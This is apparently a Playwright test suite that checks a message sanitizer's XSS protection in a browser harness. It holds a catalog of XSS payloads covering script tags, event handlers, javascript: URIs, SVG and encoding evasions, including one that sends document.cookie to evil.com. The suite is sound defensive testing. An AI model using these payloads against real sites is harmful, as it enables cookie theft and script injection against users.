/**
 * XSS Sanitization Tests — QA-002 (GitHub #5)
 *
 * Browser-executed Playwright tests that prove the message sanitizer
 * prevents XSS when content is rendered via innerHTML.
 *
 * Strategy:
 * 1. Load a test harness page with a render target div
 * 2. Sanitize malicious payloads through the message-sanitizer pipeline
 * 3. Inject sanitized output via innerHTML (simulating real rendering)
 * 4. Verify NO script execution occurs (canary remains false)
 * 5. Verify the DOM contains safe, escaped content
 */

import { test, expect } from '@playwright/test';
import {
  sanitizeMessage,
  escapeHtml,
  stripHtmlTags,
  detectHtmlXss,
  sanitizeForExternalChannel,
} from '../../lib/message-sanitizer';

// ─── Helpers ──────────────────────────────────────────────────────────────

const HARNESS_HTML = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>XSS Test</title></head>
<body>
  <div id="render-target"></div>
  <div id="raw-target"></div>
  <div id="activity-name"></div>
  <div id="message-display"></div>
  <script>
    window.__xss_triggered = false;
    window.__xss_payloads = [];
    window.alert = function(msg) {
      window.__xss_triggered = true;
      window.__xss_payloads.push('alert:' + msg);
    };
    window.confirm = function(msg) {
      window.__xss_triggered = true;
      window.__xss_payloads.push('confirm:' + msg);
      return false;
    };
    window.prompt = function(msg) {
      window.__xss_triggered = true;
      window.__xss_payloads.push('prompt:' + msg);
      return null;
    };
    window.__renderContent = function(containerId, html) {
      document.getElementById(containerId).innerHTML = html;
    };
  </script>
</body>
</html>`;

/**
 * Load the test harness into the page via setContent (avoids file:// issues).
 */
async function loadHarness(page: import('@playwright/test').Page) {
  await page.setContent(HARNESS_HTML, { waitUntil: 'domcontentloaded' });
}

/**
 * Inject content via innerHTML into a container and check XSS canary.
 */
async function injectAndCheck(
  page: import('@playwright/test').Page,
  content: string,
  containerId = 'render-target'
) {
  // Inject sanitized content via innerHTML
  await page.evaluate(
    ({ id, html }) => {
      (window as any).__renderContent(id, html);
    },
    { id: containerId, html: content }
  );

  // Small delay to let any deferred scripts/handlers fire
  await page.waitForTimeout(100);

  // Check XSS canary
  const xssTriggered = await page.evaluate(() => (window as any).__xss_triggered);
  const xssPayloads = await page.evaluate(() => (window as any).__xss_payloads);

  return { xssTriggered, xssPayloads };
}

/**
 * Reset the XSS canary between tests within the same page.
 */
async function resetCanary(page: import('@playwright/test').Page) {
  await page.evaluate(() => {
    (window as any).__xss_triggered = false;
    (window as any).__xss_payloads = [];
  });
}

// ─── XSS Payload Catalog ─────────────────────────────────────────────────

const XSS_PAYLOADS = {
  // Basic script injection
  basicScript: '<script>alert(1)</script>',
  scriptWithContent: '<script>window.__xss_triggered=true</script>',

  // Event handler attacks
  imgOnerror: '<img src=x onerror="alert(1)">',
  imgOnload: '<img src=x onload="alert(1)">',
  svgOnload: '<svg onload="alert(1)">',
  bodyOnload: '<body onload="alert(1)">',
  divOnmouseover: '<div onmouseover="alert(1)">hover me</div>',
  inputOnfocus: '<input onfocus="alert(1)" autofocus>',
  marqueeOnstart: '<marquee onstart="alert(1)">',
  detailsOntoggle: '<details ontoggle="alert(1)" open>',

  // URI-based attacks
  anchorJavascript: '<a href="javascript:alert(1)">click</a>',
  iframeSrc: '<iframe src="javascript:alert(1)"></iframe>',
  iframeDataUri: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
  objectData: '<object data="javascript:alert(1)">',
  embedSrc: '<embed src="javascript:alert(1)">',

  // CSS-based attacks
  styleExpression: '<div style="background:url(javascript:alert(1))">',
  styleImport: '<style>@import "javascript:alert(1)"</style>',

  // Encoding evasion attempts
  htmlEntityScript: '&lt;script&gt;alert(1)&lt;/script&gt;',  // already escaped
  mixedCase: '<ScRiPt>alert(1)</sCrIpT>',
  nullByte: '<scr\x00ipt>alert(1)</script>',
  tabInTag: '<img\tsrc=x\tonerror="alert(1)">',
  newlineInTag: '<img\nsrc=x\nonerror="alert(1)">',

  // SVG-based attacks
  svgScript: '<svg><script>alert(1)</script></svg>',
  svgAnimate: '<svg><animate onbegin="alert(1)" attributeName="x">',
  svgSet: '<svg><set onbegin="alert(1)" attributeName="x">',
  svgForeignObject: '<svg><foreignObject><body onload="alert(1)"></body></foreignObject></svg>',

  // Meta-based attacks
  metaRefresh: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  baseHref: '<base href="javascript://">',

  // Template/comment tricks
  htmlComment: '<!--<script>alert(1)</script>-->',
  templateTag: '<template><script>alert(1)</script></template>',

  // Form-based
  formAction: '<form action="javascript:alert(1)"><input type=submit>',

  // Nested / compound payloads
  nestedScript: '<div><script>alert(1)</script></div>',
  multiPayload: '<img src=x onerror=alert(1)><script>alert(2)</script><svg onload=alert(3)>',

  // Real-world activity name injections
  activityWithScript: 'Morning Run<script>document.cookie</script>',
  activityWithImg: 'Yoga Session<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">',
  activityWithSvg: 'Team Meeting<svg/onload=alert(document.domain)>',
};

// ─── Tests ────────────────────────────────────────────────────────────────

test.describe('XSS Sanitization — Browser Execution Tests', () => {
  test.describe('escapeHtml unit verification in browser', () => {
    test('escapes all HTML special characters', async ({ page }) => {
      await loadHarness(page);

      const testCases = [
        { input: '<script>alert(1)</script>', expected: '&lt;script&gt;alert(1)&lt;/script&gt;' },
        { input: '<img src=x onerror="alert(1)">', expected: '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;' },
        { input: "it's a <test> & more", expected: 'it&#x27;s a &lt;test&gt; &amp; more' },
        { input: '"double" & \'single\'', expected: '&quot;double&quot; &amp; &#x27;single&#x27;' },
      ];

      for (const { input, expected } of testCases) {
        const result = escapeHtml(input);
        expect(result).toBe(expected);
      }
    });
  });

  test.describe('detectHtmlXss flags dangerous patterns', () => {
    test('detects script tags', () => {
      const result = detectHtmlXss('<script>alert(1)</script>');
      expect(result.dangerous).toBe(true);
      expect(result.patterns).toContain('script_tag');
    });

    test('detects event handlers', () => {
      const result = detectHtmlXss('<img onerror="alert(1)">');
      expect(result.dangerous).toBe(true);
      expect(result.patterns).toContain('event_handler');
    });

    test('detects javascript URIs', () => {
      const result = detectHtmlXss('<a href="javascript:alert(1)">');
      expect(result.dangerous).toBe(true);
      expect(result.patterns).toContain('javascript_uri');
    });

    test('clean text is not flagged', () => {
      const result = detectHtmlXss('Normal activity name: Morning Run');
      expect(result.dangerous).toBe(false);
      expect(result.patterns).toHaveLength(0);
    });
  });

  test.describe('Basic script injection — sanitized content in innerHTML', () => {
    test('blocks <script>alert(1)</script>', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.basicScript);
      const { xssTriggered, xssPayloads } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);
      expect(xssPayloads).toHaveLength(0);
      expect(sanitized.content).not.toContain('<script>');
    });

    test('blocks <script>window.__xss_triggered=true</script>', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.scriptWithContent);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);

      // Also verify the canary wasn't set via any other mechanism
      const canary = await page.evaluate(() => (window as any).__xss_triggered);
      expect(canary).toBe(false);
    });
  });

  test.describe('Event handler attacks — onerror, onload, etc.', () => {
    const eventHandlerPayloads = [
      ['imgOnerror', XSS_PAYLOADS.imgOnerror],
      ['imgOnload', XSS_PAYLOADS.imgOnload],
      ['svgOnload', XSS_PAYLOADS.svgOnload],
      ['bodyOnload', XSS_PAYLOADS.bodyOnload],
      ['divOnmouseover', XSS_PAYLOADS.divOnmouseover],
      ['inputOnfocus', XSS_PAYLOADS.inputOnfocus],
      ['marqueeOnstart', XSS_PAYLOADS.marqueeOnstart],
      ['detailsOntoggle', XSS_PAYLOADS.detailsOntoggle],
    ] as const;

    for (const [name, payload] of eventHandlerPayloads) {
      test(`blocks ${name}: ${payload}`, async ({ page }) => {
        await loadHarness(page);
        const sanitized = sanitizeMessage(payload);
        const { xssTriggered, xssPayloads } = await injectAndCheck(page, sanitized.content);

        expect(xssTriggered).toBe(false);
        expect(xssPayloads).toHaveLength(0);
      });
    }
  });

  test.describe('URI-based attacks — javascript:, data:', () => {
    const uriPayloads = [
      ['anchorJavascript', XSS_PAYLOADS.anchorJavascript],
      ['iframeSrc', XSS_PAYLOADS.iframeSrc],
      ['iframeDataUri', XSS_PAYLOADS.iframeDataUri],
      ['objectData', XSS_PAYLOADS.objectData],
      ['embedSrc', XSS_PAYLOADS.embedSrc],
    ] as const;

    for (const [name, payload] of uriPayloads) {
      test(`blocks ${name}: ${payload}`, async ({ page }) => {
        await loadHarness(page);
        const sanitized = sanitizeMessage(payload);
        const { xssTriggered } = await injectAndCheck(page, sanitized.content);

        expect(xssTriggered).toBe(false);
        // Verify no executable tags remain
        expect(sanitized.content).not.toMatch(/<script|<iframe|<object|<embed/i);
      });
    }
  });

  test.describe('SVG-based attacks', () => {
    const svgPayloads = [
      ['svgScript', XSS_PAYLOADS.svgScript],
      ['svgOnload', XSS_PAYLOADS.svgOnload],
      ['svgAnimate', XSS_PAYLOADS.svgAnimate],
      ['svgForeignObject', XSS_PAYLOADS.svgForeignObject],
    ] as const;

    for (const [name, payload] of svgPayloads) {
      test(`blocks ${name}`, async ({ page }) => {
        await loadHarness(page);
        const sanitized = sanitizeMessage(payload);
        const { xssTriggered } = await injectAndCheck(page, sanitized.content);

        expect(xssTriggered).toBe(false);
      });
    }
  });

  test.describe('Encoding evasion attempts', () => {
    test('blocks mixed-case script tags', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.mixedCase);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);
      expect(sanitized.content).not.toMatch(/<script/i);
    });

    test('blocks tab-separated attributes', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.tabInTag);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);
    });

    test('blocks newline-separated attributes', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.newlineInTag);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);
    });
  });

  test.describe('Compound / real-world payloads', () => {
    test('blocks XSS in activity name (script appended)', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.activityWithScript);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'activity-name');

      expect(xssTriggered).toBe(false);
      // The legitimate text should survive
      expect(sanitized.content).toContain('Morning Run');
    });

    test('blocks XSS in activity name (img onerror cookie theft)', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.activityWithImg);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'activity-name');

      expect(xssTriggered).toBe(false);
      expect(sanitized.content).toContain('Yoga Session');
      // No img tag should render
      const imgCount = await page.locator('#activity-name img').count();
      expect(imgCount).toBe(0);
    });

    test('blocks XSS in activity name (svg onload)', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.activityWithSvg);
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'activity-name');

      expect(xssTriggered).toBe(false);
      expect(sanitized.content).toContain('Team Meeting');
    });

    test('blocks multi-vector attack payload', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeMessage(XSS_PAYLOADS.multiPayload);
      const { xssTriggered, xssPayloads } = await injectAndCheck(page, sanitized.content);

      expect(xssTriggered).toBe(false);
      expect(xssPayloads).toHaveLength(0);
    });
  });

  test.describe('sanitizeForExternalChannel — HTML safety', () => {
    test('escapes HTML in discord channel output', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeForExternalChannel(
        'Status: <script>alert("pwned")</script>',
        'discord'
      );
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'message-display');

      expect(xssTriggered).toBe(false);
    });

    test('escapes HTML in slack channel output', async ({ page }) => {
      await loadHarness(page);
      const sanitized = sanitizeForExternalChannel(
        'Alert: <img src=x onerror=alert(1)>',
        'slack'
      );
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'message-display');

      expect(xssTriggered).toBe(false);
    });
  });

  test.describe('Sanitizer preserves safe content', () => {
    test('normal text passes through unchanged (except HTML entities)', async ({ page }) => {
      await loadHarness(page);
      const input = 'Deploy version 2.5 to production';
      const sanitized = sanitizeMessage(input);

      // No HTML chars, so should be unchanged
      expect(sanitized.content).toBe(input);
      expect(sanitized.modified).toBe(false);
    });

    test('text with safe angle brackets is escaped but readable', async ({ page }) => {
      await loadHarness(page);
      const input = 'Use Array<string> for the type';
      const sanitized = sanitizeMessage(input);

      // Inject and verify it renders as text
      const { xssTriggered } = await injectAndCheck(page, sanitized.content, 'render-target');
      expect(xssTriggered).toBe(false);

      // The text should be visible in the page
      const text = await page.locator('#render-target').textContent();
      expect(text).toContain('Array<string>');
    });

    test('markdown content is preserved', async ({ page }) => {
      await loadHarness(page);
      const input = '# Heading\n\n**bold** and *italic*\n\n```code```';
      const sanitized = sanitizeMessage(input);

      expect(sanitized.content).toContain('# Heading');
      expect(sanitized.content).toContain('**bold**');
    });
  });

  test.describe('DOM state verification — no dangerous elements created', () => {
    test('no script elements after injecting sanitized XSS', async ({ page }) => {
      await loadHarness(page);

      // Inject ALL payloads one by one
      for (const [, payload] of Object.entries(XSS_PAYLOADS)) {
        const sanitized = sanitizeMessage(payload);
        await injectAndCheck(page, sanitized.content);

        // Verify no script tags were created inside render-target
        const scriptCount = await page.locator('#render-target script').count();
        expect(scriptCount).toBe(0);

        await resetCanary(page);
      }
    });

    test('no iframe elements after injecting sanitized XSS', async ({ page }) => {
      await loadHarness(page);

      const iframePayloads = [XSS_PAYLOADS.iframeSrc, XSS_PAYLOADS.iframeDataUri];
      for (const payload of iframePayloads) {
        const sanitized = sanitizeMessage(payload);
        await injectAndCheck(page, sanitized.content);

        const iframeCount = await page.locator('#render-target iframe').count();
        expect(iframeCount).toBe(0);

        await resetCanary(page);
      }
    });

    test('no elements with event handlers after sanitization', async ({ page }) => {
      await loadHarness(page);

      for (const [, payload] of Object.entries(XSS_PAYLOADS)) {
        const sanitized = sanitizeMessage(payload);
        await injectAndCheck(page, sanitized.content);

        // Check that no element inside render-target has any on* attribute
        const hasEventHandler = await page.evaluate(() => {
          const target = document.getElementById('render-target')!;
          const allElements = target.querySelectorAll('*');
          for (const el of allElements) {
            for (const attr of el.attributes) {
              if (attr.name.startsWith('on')) return true;
            }
          }
          return false;
        });
        expect(hasEventHandler).toBe(false);

        await resetCanary(page);
      }
    });
  });

  test.describe('Stress test — rapid sequential injection', () => {
    test('100 sequential XSS payloads, none execute', async ({ page }) => {
      await loadHarness(page);

      const payloads = Object.values(XSS_PAYLOADS);
      // Run through all payloads multiple times
      for (let round = 0; round < 3; round++) {
        for (const payload of payloads) {
          const sanitized = sanitizeMessage(payload);
          await page.evaluate(
            ({ html }) => {
              document.getElementById('render-target')!.innerHTML = html;
            },
            { html: sanitized.content }
          );
        }
      }

      // After all injections, canary should still be false
      await page.waitForTimeout(200);
      const xssTriggered = await page.evaluate(() => (window as any).__xss_triggered);
      expect(xssTriggered).toBe(false);
    });
  });

  test.describe('Edge case: escapeHtml disabled (opt-out)', () => {
    test('WITHOUT escapeHtml, XSS CAN execute (proves the fix works)', async ({ page }) => {
      await loadHarness(page);

      // Sanitize with HTML escaping DISABLED — this should be dangerous
      const unsanitized = sanitizeMessage(
        '<img src=x onerror="window.__xss_triggered=true">',
        { escapeHtmlContent: false }
      );

      // This content still has the raw HTML
      expect(unsanitized.content).toContain('<img');
      expect(unsanitized.content).toContain('onerror');

      // Inject it — XSS SHOULD fire (proving the opt-in is real)
      await page.evaluate(
        ({ html }) => {
          document.getElementById('raw-target')!.innerHTML = html;
        },
        { html: unsanitized.content }
      );
      await page.waitForTimeout(200);

      const xssTriggered = await page.evaluate(() => (window as any).__xss_triggered);
      // This SHOULD be true — proving that without escaping, XSS works
      expect(xssTriggered).toBe(true);
    });
  });
});
